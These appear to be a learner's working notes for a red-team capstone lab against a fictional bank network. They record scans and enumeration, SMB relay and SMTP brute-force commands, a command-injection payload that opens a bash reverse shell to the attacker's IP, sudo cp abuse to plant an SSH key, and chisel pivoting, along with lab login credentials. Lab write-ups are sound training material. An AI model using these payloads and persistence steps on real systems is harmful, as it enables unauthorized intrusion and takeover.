****
Red Team Capstone Challenge
SSH key Gen + Add our Public key in VPN Machine
Pivoting Chisel: https://github.com/jpillora/chisel/releases
****

 

SSH Username
e-citizen

SSH Password
stabilitythroughcurrency

SSH IP
10.200.116.250

Check my Creds in Kali

add:  http://swift.bank.thereserve.loc/ in etc/hosts with Web Server IP

 

1-Enumeration:

    =======================================
    Thank you for registering on e-Citizen for the Red Team engagement against TheReserve.

    Please take note of the following details and please make sure to save them, as they will not be displayed again.
    =======================================

    
  

 

    -Web Server:
        nmap -T3 -sV -sC -Pn 10.200.116.13 -vv
        PORT   STATE SERVICE REASON         VERSION
        22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
        ...
        80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
        | http-methods:
        |_  Supported Methods: OPTIONS HEAD GET POST
        |_http-server-header: Apache/2.4.29 (Ubuntu)
        |_http-title: Site doesn't have a title (text/html).

        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


        OCTOBER CMS Multiple Vulns:  <------------!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
            https://www.exploit-db.com/exploits/41936


        Port 80:
            gobuster vhost -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://swift.bank.thereserve.loc/ --exclude-length 335

            nikto -h http://swift.bank.thereserve.loc 

                http://swift.bank.thereserve.loc/info.php:

                    PHP Version 7.2.24-0ubuntu0.18.04.17

                http://swift.bank.thereserve.loc/october/index.php/demo/meettheteam:
                    User's name

                    When we select employee photos we see their FULL NAME in the URI

                http://thereserve.thm/october/:
                    October CMS 2017
                    https://www.exploit-db.com/exploits/41936

                http://thereserve.thm/october/themes/demo/assets/:
                    List files on Web Server


            └─$ gobuster dir -u http://thereserve.thm/october/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
                We Found Backend CMS Archy:
                    /themes               (Status: 301) [Size: 325] [--> http://thereserve.thm/october/themes/]
                    /modules              (Status: 301) [Size: 326] [--> http://thereserve.thm/october/modules/]
                    /storage              (Status: 301) [Size: 326] [--> http://thereserve.thm/october/storage/]
                    /plugins              (Status: 301) [Size: 326] [--> http://thereserve.thm/october/plugins/]
                    /vendor               (Status: 301) [Size: 325] [--> http://thereserve.thm/october/vendor/]
                    /config               (Status: 301) [Size: 325] [--> http://thereserve.thm/october/config/]
                    /artisan              (Status: 200) [Size: 1640]
                    /bootstrap            (Status: 301) [Size: 328] [--> http://thereserve.thm/october/bootstrap/]

                        http://thereserve.thm/october/modules/backend/controllers/
                        http://thereserve.thm/october/storage/logs/system.log
                        http://thereserve.thm/october/config/


            http://10.200.116.13/october/index.php/backend/backend/auth/signin
                admin:admin:
                    "A user was found to match all plain text credentials however hashed credential &quot;password&quot; did not match."

            Possible Attack Path (We have employees Names):
                -User Enum or Brute Force

                -Phishing:
                    http://swift.bank.thereserve.loc/october/index.php/demo/contactus:
                        Once you are ready, send us your CV and last three months banking statements

                        applications@corp.thereserve.loc
            
                        -Macro phshing - remote shell ?



    
                       


    -Internal Network IP 10.200.116.21:
        PORT     STATE SERVICE       REASON  VERSION
        22/tcp   open  ssh           syn-ack OpenSSH for_Windows_7.7 (protocol 2.0)
        135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
        139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
        445/tcp  open  microsoft-ds? syn-ack
        3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
        | rdp-ntlm-info: 
        |   Target_Name: CORP
        |   NetBIOS_Domain_Name: CORP
        |   NetBIOS_Computer_Name: WRK1
        |   DNS_Domain_Name: corp.thereserve.loc
        |   DNS_Computer_Name: WRK1.corp.thereserve.loc
        |   DNS_Tree_Name: thereserve.loc
        |   Product_Version: 10.0.17763
        |_  System_Time: 2024-04-25T16:11:36+00:00
        | ssl-cert: Subject: commonName=WRK1.corp.thereserve.loc
        | Issuer: commonName=WRK1.corp.thereserve.loc
        Host script results:
        | smb2-security-mode: 
        |   3:1:1: 
        |_    Message signing enabled but not required
        | smb2-time: 
        |   date: 2024-04-25T16:11:39
        |_  start_date: N/A

        Computer name:  WRK1.corp.thereserve.loc



    -Internal Network IP 10.200.116.22:
         └─$ nmap -sV -sC -Pn 10.200.116.22 -vv 
        PORT     STATE SERVICE       REASON  VERSION
        22/tcp   open  ssh           syn-ack OpenSSH for_Windows_7.7 (protocol 2.0)
        135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
        139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
        445/tcp  open  microsoft-ds? syn-ack
        3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services

        | rdp-ntlm-info: 
        |   Target_Name: CORP
        |   NetBIOS_Domain_Name: CORP
        |   NetBIOS_Computer_Name: WRK2
        |   DNS_Domain_Name: corp.thereserve.loc
        |   DNS_Computer_Name: WRK2.corp.thereserve.loc
        |   DNS_Tree_Name: thereserve.loc
        |   Product_Version: 10.0.17763
        |_  System_Time: 2024-04-25T17:37:17+00:00
        | smb2-security-mode: 
        |   3:1:1: 
        |_    Message signing enabled but not required
        | smb2-time: 
        |   date: 2024-04-25T17:37:17
        |_  start_date: N/A
        |_clock-skew: mean: 0s, deviation: 0s, median: -1s



    Port 445 SMB:
    SMB Relay attack:
        └─$ sudo responder -I tun0 -dwP
        └─$ sudo /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf targets.txt -smb2support

        -Awaiting if events occures

    crackmapexec smb 10.200.116.21 -u "" -p "" --shares
        -Access Denied but we have the domain: corp.thereserve.loc
        SMB Guest not enable + NO ACCESS TO LDAP



    -Mail Server 10.200.116.11:
        └─$ nmap -sV -sC -Pn 10.200.116.11 -vv
        PORT     STATE SERVICE       REASON  VERSION
        22/tcp   open  ssh           syn-ack OpenSSH for_Windows_7.7 (protocol 2.0)
        25/tcp   open  smtp          syn-ack hMailServer smtpd
        | smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
        |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
        80/tcp   open  http          syn-ack Microsoft IIS httpd 10.0
        |_http-server-header: Microsoft-IIS/10.0
        |_http-title: IIS Windows Server
        | http-methods: 
        |   Supported Methods: OPTIONS TRACE GET HEAD POST
        |_  Potentially risky methods: TRACE
        110/tcp  open  pop3          syn-ack hMailServer pop3d
        |_pop3-capabilities: USER UIDL TOP
        135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
        139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
        143/tcp  open  imap          syn-ack hMailServer imapd
        |_imap-capabilities: IMAP4 RIGHTS=texkA0001 ACL SORT completed CHILDREN CAPABILITY OK IMAP4rev1 NAMESPACE QUOTA IDLE
        445/tcp  open  microsoft-ds? syn-ack
        587/tcp  open  smtp          syn-ack hMailServer smtpd
        | smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
        |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
        3306/tcp open  mysql         syn-ack MySQL 8.0.31
        | mysql-info: 
        |   Version: 8.0.31
        |   Thread ID: 51
        |
        3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
        | ssl-cert: Subject: commonName=MAIL.thereserve.loc
        | Issuer: commonName=MAIL.thereserve.loc
        |
        | rdp-ntlm-info: 
        |   Target_Name: THERESERVE
        |   NetBIOS_Domain_Name: THERESERVE
        |   NetBIOS_Computer_Name: MAIL
        |   DNS_Domain_Name: thereserve.loc
        |   DNS_Computer_Name: MAIL.thereserve.loc
        |   DNS_Tree_Name: thereserve.loc
   
        We have an access to the email server if we enter the PROVIDE CREDS at the Begining of the ENGAGEMENT
        We use "evolution" tools in kali



        SMTP Brute Force:
            hydra -L username.txt -P mangled_passwords.txt smtp://mail.thm -v

            We found Creds !!!!!!!!!

            Lets use the creds for email sign-in:
                No-messages founded



    We have access to SMB with the creds:
        └─$ crackmapexec smb 10.200.116.22 -u xx.xx -p xxxx --shares
            SMB         10.200.116.22   445    WRK2             Share           Permissions     Remark
            SMB         10.200.116.22   445    WRK2             -----           -----------     ------
            SMB         10.200.116.22   445    WRK2             ADMIN$                          Remote Admin
            SMB         10.200.116.22   445    WRK2             C$                              Default share
            SMB         10.200.116.22   445    WRK2             IPC$            READ            Remote IPC


    We have RDP session enabled via 'remmina' - domain: corp.thereserve.locFlag1 - Flag-1: Breaching the Perimeter + Flag 2: Breaching Active Directory
    We can use the creds of the two USERS that we discovered to get access to the VPN portal and get VPN config
    
        RDP Windows Enumeration:
            systeminfo:
                machien name: WRK1
                version: Microsoft Windows Server 2019 Datacenter
                domain: corp.thereserve.loc
                
                Get current username
                    echo %USERNAME% || whoami <-- L.W
                    $env:username
                List user privilege
                    whoami /priv
                        SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
                        SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

                    whoami /groups


                List all users
                net user
                    Administrator            Cool101                  DefaultAccount
                    Guest                    HelpDesk                 john
                    sshd                     THMSetup                 WDAGUtilityAccount

                whoami /all
                    List all above

                Get-LocalUser | ft Name,Enabled,LastLogon
                Get-ChildItem C:\Users -Force | select Name


                List Network
                ipconfig /all
                    DNS server: 10.200.116.100

                List all current connections
                netstat -ano

                List all network shares
                net share
                    loot$        C:\Users\Administrator\Documents

            
            Download scripts:
                in C:\Users\Public certutil -urlcache -f http://<IP>:8080/PrivescCheck.ps1 PrivescCheck.ps1

                We found a pssibility with "Unquoted Service File"

    We have the flag 1 - Flag-1: Breaching the Perimeter + Flag 2: Breaching Active Directory



    VPN_User_Config:
        From this page "http://10.200.116.12/vpncontrol.php"
        We have been able to download all the users VPN config
        We can generate a VPN config with any user even if not in domain

    in the VPN Page via BurpSuite: 
        http://10.200.116.12/vpncontrol.php we will try to modify the url and get a remote shell 


    -VPN:
        nmap -T3 -sV -sC -Pn 10.200.116.12 -vv
        PORT   STATE SERVICE REASON  VERSION
        22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
        | ssh-hostkey: 
        |   2048 9d:4a:c1:da:bd:1a:14:7d:0e:f7:1f:67:2a:db:b9:f9 (RSA)
        | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7kZUmhU3bS2taxQ+3B/2eCYbI7JdNhuiHEXJOHd8/McZODtoiA9dMIvpF+nB9AHTDD473lmwI8ulxH98xo1dY9ZFYVRptk13poDgv4FEusxTUTgziYnSPci3EQDU0wdxYuCCrv4PxxJxXtxgORV1SwTqQmSIuPKLr5F2hQygus1JEDBl/VoNs+8hLvuQzw4cLcp0tXSjdpucnxbdeR1WCY4dkYl6h5PbqMgU7+7hV6dhPqdJn4c6Q6u7y2+8wJrDak6wGW8P6Q311JVIBJMOYzTdGOEWyEoitD0Quhf48RecFaAUlr2rSXPY1oiDvs6+dpdjfbrx9UZ+3PBKREScj
        |   256 31:e8:21:49:0a:78:ad:a1:ee:c9:a9:4d:64:8b:eb:c3 (ECDSA)
        | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMafzsJe5MJ+389may9eYT211+iXzw/PzwYstR2wcpRo60B02edEVjpnBQPQkKIszHURJhR+Go34UF/pAC8hpGo=
        |   256 53:17:b3:7d:5b:13:9a:e3:fd:e7:b9:c5:e0:b9:09:6d (ED25519)
        |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL1fECbjy8OmaHJib34Nxv4YpkMBPsjm3eD+zjGc3K5u
        80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
        |_http-title: VPN Request Portal
        |_http-server-header: Apache/2.4.29 (Ubuntu)
        | http-methods: 
        |_  Supported Methods: GET HEAD POST OPTIONS
        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


        Port 80:
            └─$ gobuster dir -u http://10.200.116.12/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
                http://10.200.116.12/vpn/

                We Found /etc/passwd + OVPN config file
                We add the VPN IP Machine into the ovpn file

                sudo openvpn corpUsername.ovpn

            WE GET ACCESS TO THE INTERNAL NETWORK !!!!!

            In the Openvpn corpUsername.com we found:
                10.200.116.21
                10.200.116.22


            Exploit VPN Machine:
                in the VPN Page via BurpSuite: 
                http://10.200.116.12/vpncontrol.php we will try to modify the url and get a remote shell:
                    pentenst monkey reverse shell -> bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

                We will add the reverse shell here:
                    GET /requestvpn.php?filename=test HTTP/1.1
                    test && /bin/bash -i >& /dev/tcp/<Tunnel IP>443 0>&1

                We use the repeater in Burp Suite:
                    We finally get a reverse shell and we found DB creds

                Easiest way we add the payload in the from:
                    Account: test && /bin/bash -i >& /dev/tcp/10.50.113.14/443 0>&1
                    nc -lvnp 443

                Enumeration:
                    Sudo version 1.8.21p2   
                    sudo -l:
                        "it show us that we can check in file via" /bin/cp
                        sudo /bin/cp /home/ubuntu/.ssh/authorized_keys /dev/stdout
                        We have the Authorized key
                        We also find root password

                        In Kali:
                            ssh-keygen -t rsa
                            we cat in the right file path 'id_rsa.pub'

                        We will add OUR RSA key to the Compromise Machine (vpnMachine):
                            LFILE=/home/ubuntu/.ssh/authorized_keys                        
                            echo "ssh-rsa <our public key>" | sudo /bin/cp /dev/stdin "$LFILE"


                        In Kali:
                            ssh ubuntu@10.200.116.12 -i /home/kali/.ssh/id_rsa
                            ssh -D950 ubuntu@10.200.116.12 (reconnect)

                        Ubuntu SHell:
                            sudo -su root:
                            @root

                From this machine we try nmap on other INTERNAL SERVERS it Works (I had to make the scan LESSS NOISY)

                root@ip-10-200-116-12:/root# nmap -Pn -sV -sC 10.200.116.31
                    Starting Nmap 7.60 ( https://nmap.org ) at 2024-05-02 01:08 UTC
                    Nmap scan report for ip-10-200-116-31.eu-west-1.compute.internal (10.200.116.31)
                    Host is up (0.00035s latency).
                    Not shown: 995 filtered ports
                    PORT     STATE SERVICE       VERSION
                    22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
                    135/tcp  open  msrpc         Microsoft Windows RPC
                    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
                    445/tcp  open  microsoft-ds?
                    3389/tcp open  ms-wbt-server Microsoft Terminal Services
                    ssl-cert: Subject: commonName=SERVER1.corp.thereserve.loc
                    ...
                    Host script results:
                    | smb2-security-mode: 
                    |   2.02: 
                    |_    Message signing enabled but not required
                    | smb2-time: 
                    |   date: 2024-05-02 01:08:49
                    |_  start_date: 1601-01-01 00:00:00


            Pivoting with Chisel (Perform a successfull Nmap scan from Kali by passing through the COMPROMISE VPNMACHINE):
                In compromise Machine:
                    root@ip-10-200-116-12:/home# mkdir adib
                    root@ip-10-200-116-12:/home# ls
                    adib  ubuntu
                    root@ip-10-200-116-12:/home# cd adib
                    root@ip-10-200-116-12:/home/adib# 

                In Kali:
                    sudo python3 -m http.server
                    add the chisel bynari for linux:
                        https://github.com/jpillora/chisel/releases

                In Machine:
                    root@ip-10-200-116-12:/home/adib# wget http://10.50.113.14:8000/chisel
                    root@ip-10-200-116-12:/home/adib# chmod +x chisel
                                

                In Kali:
                    chisel server -p 8000 -reverse

                In Machine:
                    root@ip-10-200-116-12:/home/adib# ./chisel client <KaliIP:PORT> R:socks

                In Kali:
                proxychains nmap -sT -Pn 10.200.116.32
                PORT     STATE SERVICE       VERSION
                22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
                ..
                135/tcp  open  msrpc         Microsoft Windows RPC
                139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
                3389/tcp open  ms-wbt-server Microsoft Terminal Services
                | ssl-cert: Subject: commonName=SERVER2.corp.thereserve.loc
                | Not valid before: 2024-04-08T18:12:35
                |_Not valid after:  2024-10-08T18:12:35
                |_ssl-date: 2024-05-02T01:56:00+00:00; -1s from scanner time.
                MAC Address: 02:EF:07:A0:8C:8F (Unknown)
                Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

